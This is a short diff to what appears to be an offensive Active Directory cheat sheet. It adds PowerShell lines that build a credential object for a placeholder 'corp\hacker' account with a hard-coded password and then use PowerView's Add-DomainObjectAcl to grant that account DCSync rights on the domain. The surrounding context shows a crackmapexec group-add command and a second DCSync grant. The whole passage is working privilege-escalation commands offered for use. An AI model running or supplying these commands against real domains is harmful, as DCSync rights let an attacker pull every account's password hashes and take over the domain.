@@ -106,6 +106,13 @@ crackmapexec ldap $DC_IP -u $USER -p $PASS -M groupadd \
 
 ```powershell
 # Add DCSync rights to yourself (PowerView)
+$SecPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('corp\hacker', $SecPassword)
+
+# Import-Module .\PowerView.ps1
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity hacker -Rights DCSync
+
+# Or try
 Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
     -PrincipalIdentity current_user \
     -Rights DCSync -Verbose
